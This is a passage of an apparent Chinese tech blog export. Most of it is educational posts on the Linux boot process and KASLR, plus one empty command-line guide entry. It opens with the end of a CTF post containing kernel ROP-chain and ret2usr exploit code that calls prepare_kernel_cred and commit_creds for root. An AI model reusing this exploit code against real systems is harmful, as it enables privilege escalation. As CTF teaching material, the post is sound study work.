<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">|......| &lt;- rsp </span><br><span class="line">|......| </span><br><span class="line">|......| &lt;- rsp + 0x40</span><br><span class="line">|canary|</span><br><span class="line">|gadget 1| &lt;- ret &lt;- pop rdi, ret</span><br><span class="line">|    0   |</span><br><span class="line">|prepare_kernel_cred| -&gt; return rax</span><br><span class="line"></span><br><span class="line">|gadget 2| &lt;- mov rdi, rax, ret</span><br><span class="line">|commit_creds|</span><br><span class="line"></span><br><span class="line">|gadget 3| &lt;- swapgs; ret;</span><br><span class="line">|gadget 3| &lt;- iretq; ret;</span><br><span class="line">|shell addr|</span><br><span class="line">|cs|</span><br><span class="line">|user_rflags|</span><br><span class="line">|user_sp|</span><br><span class="line">|user_ss|</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<ol>
<li>首先填充满已知区域，配置 Canary</li>
<li>gadget 1 调用 prepare_kernel_cred</li>
<li>gagdet 2 调用 commit_creds</li>
<li>gadget 3 切换用户态</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> offset = vmlinux_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset;</span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset;</span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)shell;</span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><p>ret2usr 的方法利用用户空间的进程不能访问内核空间，但内核空间能访问用户空间特性使得内核代码或者数据流向用户空间，以 ring 0 特权执行用户空间代码完成提权</p>
<p>与 ROP 的不同：</p>
<ol>
<li><p>ROP 通过内核 ROP 链执行提权，返回用户态后执行 system，获取shell</p>
</li>
<li><p>ret2usr 直接返回到用户空间构造的函数指针来实现提权</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getroot</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span>  (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] root now&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ROP chain</span></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> offset = vmlinux_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)getroot;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset;</span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Command Line Guide - CLI</title>
    <url>/2022/05/13/Command-Line-Guide/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="CLI-安装"><a href="#CLI-安装" class="headerlink" title="CLI 安装"></a>CLI 安装</h1><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><h3 id="Extensions"><a href="#Extensions" class="headerlink" title="Extensions"></a>Extensions</h3>]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>Command</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel 之 开天辟地</title>
    <url>/2022/05/13/Linux-Kernel-%E4%B9%8B-%E5%BC%80%E5%A4%A9%E8%BE%9F%E5%9C%B0/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="从-CPU-开始"><a href="#从-CPU-开始" class="headerlink" title="从 CPU 开始"></a>从 CPU 开始</h2><h3 id="通电启动复位"><a href="#通电启动复位" class="headerlink" title="通电启动复位"></a>通电启动复位</h3><p>在 CPU 通电后，会对内置寄存器进行复位</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">IP          0xfff0</span><br><span class="line">CS selector 0xf000</span><br><span class="line">CS base     0xffff0000</span><br></pre></td></tr></table></figure>
<p>这也就意味着 <code>Phsical Address = CS * 16 + IP = 0xFFFFFFF0</code></p>
<p>此地称之为 <strong>复位向量</strong> 即 CPU 重置后期望执行的第一条语句的内存地址，可以看到他仅包含简单的跳转指令，可以理解为 <code>jump _start16bit - ( . + 2)</code>，即跳转到 BIOS</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">    .section &quot;.reset&quot;, &quot;ax&quot;, %progbits</span><br><span class="line">    .code16</span><br><span class="line">.globl    _start</span><br><span class="line">_start:</span><br><span class="line">    .byte  0xe9</span><br><span class="line">    .int   _start16bit - ( . + 2 )</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h3 id="BIOS-搜索引导程序"><a href="#BIOS-搜索引导程序" class="headerlink" title="BIOS 搜索引导程序"></a>BIOS 搜索引导程序</h3><p>BIOS即基本输入输出系统，它主要工作是根据记录的可引导设备列表进行搜索可引导程序</p>
<p>我们常见的可引导设备就是硬盘，对于硬盘，BIOS将会搜索其引导扇区，如果硬盘存在 MBR 分区，则引导扇区存储在第一个扇区的前 446 字节处，扇区的结尾是 <code>0x55</code> 和 <code>0xaa</code>，BIOS 通常是通过这两个魔术字节来判断设备是否可引导。</p>
<p>对于 Linux 来说有很多的引导程序，Linux 内核通过 Boot protocal 定义实现引导程序</p>
<p><strong>以 GRUB 2 为例</strong><br>常规来说，启动扇区的代码是 <code>boot.img</code>，通常仅占有 1 个扇区，做完必要的初始化后就跳转到 <code>GRUB 2 core image</code> 执行，对应的代码可以参照 <code>diskboot.img</code>，通常存储在引导扇区之后第一个可用分区之前，能够将引导程序的代码和文件加载到程序中，…，最后使用 GRUB <code>boot</code> 命令引导选择的操作系统</p>
<p>在内核被引导入内存后，内存使用情况如下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">         | Protected-mode kernel  |</span><br><span class="line">100000   +------------------------+</span><br><span class="line">         | I/O memory hole        |</span><br><span class="line">0A0000   +------------------------+</span><br><span class="line">         | Reserved for BIOS      | Leave as much as possible unused</span><br><span class="line">         ~                        ~</span><br><span class="line">         | Command line           | (Can also be below the X+10000 mark)</span><br><span class="line">X+10000  +------------------------+</span><br><span class="line">         | Stack/heap             | For use by the kernel real-mode code.</span><br><span class="line">X+08000  +------------------------+</span><br><span class="line">         | Kernel setup           | The kernel real-mode code.</span><br><span class="line">         | Kernel boot sector     | The kernel legacy boot sector.</span><br><span class="line">       X +------------------------+</span><br><span class="line">         | Boot loader            | &lt;- Boot sector entry point 0x7C00</span><br><span class="line">001000   +------------------------+</span><br><span class="line">         | Reserved for MBR/BIOS  |</span><br><span class="line">000800   +------------------------+</span><br><span class="line">         | Typically used by MBR  |</span><br><span class="line">000600   +------------------------+</span><br><span class="line">         | BIOS use only          |</span><br><span class="line">000000   +------------------------+</span><br></pre></td></tr></table></figure>

<h2 id="由内核发力"><a href="#由内核发力" class="headerlink" title="由内核发力"></a>由内核发力</h2><h3 id="内核设置"><a href="#内核设置" class="headerlink" title="内核设置"></a>内核设置</h3><p>此时内核已经被引导进入内存中，虽然控制权已经转交给内核，但是并未真正的运行起来，需要进行一系列的设置</p>
<p>内核设置代码的起点是 <code>/arch/x86/boot/header.S</code>，原先 kernel 会自带 bootloader 进行启动，但是现在仅输出错误信息</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">	.global bootsect_start</span><br><span class="line">bootsect_start:</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ifdef CONFIG_EFI_STUB</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash"><span class="string">&quot;MZ&quot;</span>, MS-DOS header</span></span><br><span class="line">	.word	MZ_MAGIC</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Normalize the start address</span></span><br><span class="line">	ljmp	$BOOTSEG, $start2</span><br><span class="line"></span><br><span class="line">start2:</span><br><span class="line">	movw	%cs, %ax</span><br><span class="line">	movw	%ax, %ds</span><br><span class="line">	movw	%ax, %es</span><br><span class="line">	movw	%ax, %ss</span><br><span class="line">	xorw	%sp, %sp</span><br><span class="line">	sti</span><br><span class="line">	cld</span><br><span class="line"></span><br><span class="line">	movw	$bugger_off_msg, %si</span><br><span class="line"></span><br><span class="line">bugger_off_msg:</span><br><span class="line">	.ascii	&quot;Use a boot loader.\r\n&quot;</span><br><span class="line">	.ascii	&quot;\n&quot;</span><br><span class="line">	.ascii	&quot;Remove disk and press any key to reboot...\r\n&quot;</span><br><span class="line">	.byte	0</span><br></pre></td></tr></table></figure>
<p>现在将会从 <code>_start</code> 开始</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">offset 512, entry point // 0x200 偏移处</span></span><br><span class="line"></span><br><span class="line">	.globl	_start</span><br><span class="line">_start:</span><br><span class="line">        .byte	0xeb		# short (2-byte) jump</span><br><span class="line">        .byte	start_of_setup-1f // 跳转到 setup 阶段</span><br><span class="line">1: // setup header 结构</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">	.section &quot;.entrytext&quot;, &quot;ax&quot;</span><br><span class="line">start_of_setup:</span><br></pre></td></tr></table></figure>
<p>这里需要了解到，在从 <code>GRUB</code> 跳转到 <code>_start</code> 时，设置的代码如下，即将 CS 代码段偏移增加 <code>0x20</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">state.gs = state.fs = state.es = state.ds = state.ss = segment;</span><br><span class="line">state.cs = segment + 0x20;</span><br></pre></td></tr></table></figure>

<h3 id="start-of-setup"><a href="#start-of-setup" class="headerlink" title="start_of_setup"></a>start_of_setup</h3><p><strong>段寄存器设置</strong><br>首先对段寄存器进行设置，强制 ES 段与 DS 段相同</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Force %es = %ds</span></span><br><span class="line">	movw	%ds, %ax</span><br><span class="line">	movw	%ax, %es</span><br><span class="line">	cld</span><br></pre></td></tr></table></figure>
<p>随后对 SS 段进行设置，具体操作如下：</p>
<ul>
<li>首先判断 SS 段与 DS ES 段是否相同，并将 SP 寄存器放在 dx 寄存器内<ul>
<li>如果相同则跳转到 2f，对 dx 即 sp 寄存器进行对齐操作，<ul>
<li>如果失败则将 sp 设置为 <code>0xfffc</code></li>
<li>如果正确结束</li>
</ul>
</li>
<li>如果不相同则构造新的栈，首先将 <code>_end</code> 设置给 dx，并判断是否设置 <code>CAN_USE_HEAP</code><ul>
<li>如果设置，则将 heap_end_ptr 置于 dx 寄存器，加上 <code>STACK_SIZE</code></li>
<li>如果没有设置，则将 dx 直接加上 <code>STACK_SIZE</code><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">	movw	%ss, %dx</span><br><span class="line">	cmpw	%ax, %dx	# %ds == %ss?</span><br><span class="line">	movw	%sp, %dx</span><br><span class="line">	je	2f		# -&gt; assume %sp is reasonably set</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Invalid %ss, make up a new stack</span></span><br><span class="line">	movw	$_end, %dx</span><br><span class="line">	testb	$CAN_USE_HEAP, loadflags</span><br><span class="line">	jz	1f</span><br><span class="line">	movw	heap_end_ptr, %dx</span><br><span class="line">1:	addw	$STACK_SIZE, %dx</span><br><span class="line">	jnc	2f</span><br><span class="line">	xorw	%dx, %dx	# Prevent wraparound</span><br><span class="line"></span><br><span class="line">2:	# Now %dx should point to the end of our stack space</span><br><span class="line">	andw	$~3, %dx	# dword align (might as well...)</span><br><span class="line">	jnz	3f</span><br><span class="line">	movw	$0xfffc, %dx	# Make sure we&#x27;re not zero</span><br><span class="line">3:	movw	%ax, %ss</span><br><span class="line">	movzwl	%dx, %esp	# Clear upper half of %esp</span><br><span class="line">	sti			# Now we should have a working stack</span><br></pre></td></tr></table></figure>
将 DS 段与 CS 段置为同值<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">	pushw	%ds</span><br><span class="line">	pushw	$6f</span><br><span class="line">	lretw</span><br><span class="line">6:</span><br></pre></td></tr></table></figure>
此时，如果 SS &#x3D;&#x3D; DS，目前的堆栈情况为：<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132021604.png"><br>如果 SS !&#x3D; DS，且 设置 USE_HEAP，则堆栈情况为：<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132023418.png"><br>如果 SS !&#x3D; DS，且不设置 USE_HEAP，则堆栈情况为：<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132024069.png"></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>BSS 段设置</strong><br>BSS 段主要用来存放没有被初始化的静态变量，对于此段的内存，linux 将会对齐进行清零</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">movw    $__bss_start, %di</span><br><span class="line">movw    $_end+3, %cx</span><br><span class="line">xorl    %eax, %eax</span><br><span class="line">subw    %di, %cx</span><br><span class="line">shrw    $2, %cx</span><br><span class="line">rep; stosl</span><br></pre></td></tr></table></figure>
<p>代码执行完毕后，将对得到如下BSS段<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205132027504.png"></p>
<p>紧接着就跳转到 <code>main</code> 函数执行 C 代码</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Jump to C code (should not <span class="built_in">return</span>)</span></span><br><span class="line">	calll	main</span><br></pre></td></tr></table></figure>

<h2 id="准备启动"><a href="#准备启动" class="headerlink" title="准备启动"></a>准备启动</h2><h3 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h3><p>首先简要介绍一下保护模式和实模式的区别，因为在64位操作系统之前，内核必须切换到保护模式才能运行</p>
<p>保护模式的主要改变：</p>
<ul>
<li>将实模式的20根地址线转换为32位，系统可以访问多达 4G 的地址空间</li>
<li>引入内存分页管理方法</li>
</ul>
<p>在保护模式中，内存段的大小和位置使用 <code>段描述符</code> 进行描述，通过段描述符可以知道段的属性和状态，段描述符的主要结构如下，每个描述符的长度是 64 位，均存储在 <code>全局描述符表 GDT</code> 中</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">31          24        19      16              7            0</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|             | |B| |A|       | |   | |0|E|W|A|            |</span><br><span class="line">| BASE 31:24  |G|/|L|V| LIMIT |P|DPL|S|  TYPE | BASE 23:16 | 4</span><br><span class="line">|             | |D| |L| 19:16 | |   | |1|C|R|A|            |</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">|                             |                            |</span><br><span class="line">|        BASE 15:0            |       LIMIT 15:0           | 0</span><br><span class="line">|                             |                            |</span><br><span class="line">------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>全局描述符表 在内存中的位置不定，其地址保存在 <code>GDTR</code> 特殊寄存器中，汇编代码大概是 <code>lgdt gdt</code>，GDTR 是 48 位寄存器，基址 32 位，大小 16 位。</p>
<p>而此时所谓的段寄存器 DS SS ES 等存储的均是 <code>段选择子</code>，其结构如下，即 CPU 通过以下步骤找到物理地址：段选择子-&gt;段描述符-&gt;段基址+偏移</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">-----------------------------</span><br><span class="line">|       Index    | TI | RPL |</span><br><span class="line">-----------------------------</span><br><span class="line">GDT 段描述符索引号 ｜GDT or LDT ｜ 请求优先级</span><br></pre></td></tr></table></figure>

<p>从实模式进入保护模式，需要执行以下操作：</p>
<ul>
<li>禁止中断发生</li>
<li>使用命令将 GDT 装入 GDTR</li>
<li>设置 CR0 PE 位为 1，使寄存器进入保护模式</li>
<li>跳转执行保护模式代码</li>
</ul>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>可以提前看到，此处在实模式下内核基本配置完成后，对硬件的一些信息获取，如 CPU 内存 键盘<br><strong>copy_boot_params</strong><br>此处主要是将前面定义的 <code>struct setup_header hdr</code> 拷贝到 <code>boot params</code> 中<br><strong>console_init</strong><br>初始化命令行，通过分析 <code>earlyprintk</code>，对相应串口进行初始化<br><strong>init_heap</strong><br>在前面设置过程中对堆栈和BSS进行初始化后，内核需要初始化全局堆，即此函数得目标，主要流程是通过计算 <code>stack_end</code> 和 <code>heap_end</code> 对堆进行初始化<br><strong>validate_cpu</strong><br>此处对 CPU 的类型进行检查，我们只需要了解：</p>
<ul>
<li>如果 CPU 标志为 64 位，则设置 long mode</li>
<li>根据制造商的不同，设置不同的CPU选项</li>
</ul>
<p><strong>set_bios_mode</strong><br>告知 BIOS 我们将要运行在什么CPU模式下<br><strong>detect_memory</strong><br>内存侦测主要是得到当前内存的使用分布，通常使用多种编程接口<br><strong>keyboard_init</strong><br>通过 0x16 中断获取键盘状态并设置按键检测频率<br><strong>系统参数查询</strong><br>系统参数查询，这里主要有：</p>
<ul>
<li>ist</li>
<li>apm_bios</li>
<li>edd</li>
</ul>
<p><strong>set_video</strong><br>依旧是通过之前的 <code>setup hdr</code> 数据结构进行获取初始参数，通过对内存 heap 进行读写</p>
<p><strong>go_to_protected_mode</strong><br>此处将进入保护模式，我们主要关注：</p>
<ol>
<li>setup_idt 设置中断描述符表 <code>lidtl null_idt</code></li>
<li>setup_gdt 设置全局描述符表 <code>lgdtl gdt</code></li>
<li>protected_mode_jump 保护模式跳转</li>
</ol>
<p>保护模式下代码的第一步会重置所有段寄存器（CS 除外），将他们指向数据段，并将通用寄存器清零（eax 除外）</p>
<h2 id="过渡-64-位模式"><a href="#过渡-64-位模式" class="headerlink" title="过渡 64 位模式"></a>过渡 64 位模式</h2><p>在 x86 linux 内核引导协议中写到<br><code>当使用 bzImage 时，保护模式下内核被重定位至 0x100000 处</code></p>
<p><strong>32 位入口点</strong><br>源码位置：<code>/arch/x86/boot/compressed/head_64.S</code></p>
<p>为什么称之为 compressed，因为 <code>bzImage</code> 是由 <code>vmlinux + 头文件 + 内核启动代码</code> 通过 gzip 压缩得来，因此源码主要进行切换模式的准备工作，在进入长模式后再解压内核</p>
<p><strong>计算重定位地址</strong></p>
<p>在必要的时候计算解压缩之后的地址，默认的内核基地址由内核编译项 <code>CONFIG_PHYSICAL_START</code> 所确定，其默认值为 <code>0x1000000</code></p>
<p><strong>长模式</strong><br>长模式是 X86_64 的原生模式，为了切换，需要进行一下操作：</p>
<ul>
<li>启用 PAE</li>
<li>建立页表并将顶级页表地址放入 cr3 寄存器</li>
<li>启用 EFER.LME</li>
<li>启用分页 - 设置 <code>cr0</code> 寄存器的 <code>PG</code> 和 <code>PE</code> 启动分页</li>
</ul>
<p><strong>初期页表初始化</strong><br>Linux 内核使用 4 级页表，可以构建初始 4G 页表，映射 4G 内存</p>
<ul>
<li>4 级页映射表 - 1</li>
<li>页目录指针表 - 1</li>
<li>页目录表 - 4</li>
</ul>
<h2 id="内核解压缩-加载地址随机化"><a href="#内核解压缩-加载地址随机化" class="headerlink" title="内核解压缩 - 加载地址随机化"></a>内核解压缩 - 加载地址随机化</h2><p>源码入口：<code>arch/x86/boot/compressed/misc.c/extract_kernel() -&gt; choose_random_location</code></p>
<p>可以参考：<code>/Documentation/x86/x86_64/mm.rst</code><br>首先对一些配置的默认设置进行分析</p>
<ul>
<li>在默认情况下，如果 X86_64 开启 4 级页表，则页的默认偏移基址为 <code>0xffff888000000000</code>，页的对齐大小必须是处于 <code>0x200000</code> 到 <code>0x1000000，即</code> 2M 到 16M，且是 <code>0x200000</code> 的倍数</li>
<li>内核映射的基础地址为 <code>0xffffffff80000000</code>，如果启用 KASLR 则内核镜像大小为 1G，否则为 512M<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __PAGE_OFFSET_BASE_L5	_AC(0xff11000000000000, UL)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __PAGE_OFFSET_BASE_L4	_AC(0xffff888000000000, UL)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __START_KERNEL_map	_AC(0xffffffff80000000, UL)</span></span><br><span class="line"></span><br><span class="line">config PHYSICAL_START</span><br><span class="line">	hex &quot;Physical address where the kernel is loaded&quot; if (EXPERT || CRASH_DUMP)</span><br><span class="line">	default &quot;0x1000000&quot;</span><br><span class="line"></span><br><span class="line">config PHYSICAL_ALIGN</span><br><span class="line">	hex &quot;Alignment value to which kernel should be aligned&quot;</span><br><span class="line">	default &quot;0x200000&quot;</span><br><span class="line">	range 0x2000 0x1000000 if X86_32</span><br><span class="line">	range 0x200000 0x1000000 if X86_64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ifdef CONFIG_RANDOMIZE_BASE</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define KERNEL_IMAGE_SIZE	(1024 * 1024 * 1024) // 1G</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define KERNEL_IMAGE_SIZE	(512 * 1024 * 1024) // 512M</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>接下来分析选取随机化的流程：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 判断是否传入 nokaslr 信号</span><br><span class="line">if (cmdline_find_option_bool(&quot;nokaslr&quot;)) &#123;</span><br><span class="line">    warn(&quot;KASLR disabled: &#x27;nokaslr&#x27; on cmdline.&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 对内存进行限制</span><br><span class="line">if (IS_ENABLED(CONFIG_X86_32))</span><br><span class="line">    mem_limit = KERNEL_IMAGE_SIZE;</span><br><span class="line">else</span><br><span class="line">    mem_limit = MAXMEM;</span><br><span class="line"></span><br><span class="line">// 记录非安全区域，在随机过程中进行规避</span><br><span class="line">mem_avoid_init(input, input_size, *output);</span><br><span class="line"></span><br><span class="line">// 物理地址随机化</span><br><span class="line">random_addr = find_random_phys_addr(min_addr, output_size);</span><br><span class="line"></span><br><span class="line">// 虚拟地址随机化</span><br><span class="line">random_addr = find_random_virt_addr(LOAD_PHYSICAL_ADDR, output_size);</span><br></pre></td></tr></table></figure>
<p>寻找随机物理地址和随机虚拟地址的大致流程如下：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 使用 efi 或 e820 进行搜索满足条件的分配区并记录在 slot_area 数组中</span><br><span class="line">if (!process_efi_entries(minimum, image_size))</span><br><span class="line">		process_e820_entries(minimum, image_size);</span><br><span class="line"></span><br><span class="line">// 随机获取 slot area</span><br><span class="line">slots_fetch_random();</span><br><span class="line">    // 使用 RDRAND / RDTSC / i8254 进行随机数获取</span><br><span class="line">    - slot = kaslr_get_random_long(&quot;Physical&quot;) % slot_max;</span><br><span class="line">    // 通过逐步减少的方式确定 slot</span><br><span class="line">	for (i = 0; i &lt; slot_area_index; i++) &#123;</span><br><span class="line">		if (slot &gt;= slot_areas[i].num) &#123;</span><br><span class="line">			slot -= slot_areas[i].num;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		return slot_areas[i].addr + ((u64)slot * CONFIG_PHYSICAL_ALIGN);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel 之 那一束光</title>
    <url>/2022/05/14/Linux-Kernel-%E4%B9%8B-%E9%82%A3%E4%B8%80%E6%9D%9F%E5%85%89/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="内核执行的第一步"><a href="#内核执行的第一步" class="headerlink" title="内核执行的第一步"></a>内核执行的第一步</h2><h3 id="首要步骤"><a href="#首要步骤" class="headerlink" title="首要步骤"></a>首要步骤</h3><p>在调用 <code>decompress_kernel</code> 后，程序跳转到解压缩之后的程序入口点 <code>arch/x86/kernel/head_64.S</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 修复重载 gdt ldt</span><br><span class="line">call	startup_64_setup_env</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call	__startup_64</span><br><span class="line">    // 确认加载偏移 - 由 kaslr 导致</span><br><span class="line">    // 这里的 _text = __START_KERNEL</span><br><span class="line">    // #define _START_KERNEL    (__START_KERNEL_map + __PHYSICAL_START)</span><br><span class="line">    // #define __PHYSICAL_START  ALIGN(CONFIG_PHYSICAL_START, CONFIG_PHYSICAL_ALIGN)</span><br><span class="line">    load_delta = physaddr - (unsigned long)(_text - __START_KERNEL_map);</span><br><span class="line">    // 修正页表基地址</span><br><span class="line">    pgd = fixup_pointer(&amp;early_top_pgt, physaddr);</span><br><span class="line">    pmd = fixup_pointer(level2_fixmap_pgt, physaddr);</span><br><span class="line">    pud = fixup_pointer(&amp;level3_kernel_pgt, physaddr);</span><br><span class="line"></span><br><span class="line">// 初期页表映射</span><br><span class="line">addq	$(early_top_pgt - __START_KERNEL_map), %rax</span><br><span class="line">jmp 1f</span><br><span class="line"></span><br><span class="line">// 设置物理地址</span><br><span class="line">movq	%rcx, %cr4</span><br><span class="line"></span><br><span class="line">/* Setup early boot stage 4-/5-level pagetables. */</span><br><span class="line">addq	phys_base(%rip), %rax</span><br><span class="line"></span><br><span class="line">// 重新加载 GDT</span><br><span class="line">lgdt	early_gdt_descr(%rip)</span><br><span class="line"></span><br><span class="line">// 设置 初始化栈</span><br><span class="line">movq initial_stack(%rip), %rsp</span><br><span class="line"></span><br><span class="line">// 设置 IDT</span><br><span class="line">call	early_setup_idt</span><br><span class="line"></span><br><span class="line">// 检查 CPU 并对 cr0 寄存器置位</span><br><span class="line">movl	$0x80000001, %eax</span><br><span class="line">cpuid</span><br><span class="line">movl	$CR0_STATE, %eax</span><br><span class="line">/* Make changes effective */</span><br><span class="line">movq	%rax, %cr0</span><br><span class="line"></span><br><span class="line">// 保存实模式下 boot param，并跳转到 c 代码</span><br><span class="line">movq    initial_code(%rip),%rax</span><br><span class="line">pushq    $0</span><br><span class="line">pushq    $__KERNEL_CS</span><br><span class="line">pushq    %rax</span><br><span class="line">lretq</span><br></pre></td></tr></table></figure>
<h3 id="C-函数检查"><a href="#C-函数检查" class="headerlink" title="C 函数检查"></a>C 函数检查</h3><p>现在来到 <code>/arch/x86/kernel/head64.c</code><br>这里的 initial_code 是 <code>X86_64_start_kernel</code>，大致代码如下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 检查模块虚拟地址与内核虚拟地址之间的关系</span><br><span class="line">BUILD_BUG_ON(MODULES_VADDR &lt; __START_KERNEL_map);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 存储多CPU中的 cr4 的 shadow copy，因为上下文切换可能会修改 cr4 中的位</span><br><span class="line">cr4_init_shadow();</span><br><span class="line"></span><br><span class="line">// 重置全局页目录项以及清空 BSS 段</span><br><span class="line">reset_early_page_tables();</span><br><span class="line">clear_bss();</span><br><span class="line">clear_page(init_top_pgt);</span><br></pre></td></tr></table></figure>
<p><strong>初期中断与异常处理</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">idt_setup_early_handler();</span><br></pre></td></tr></table></figure>
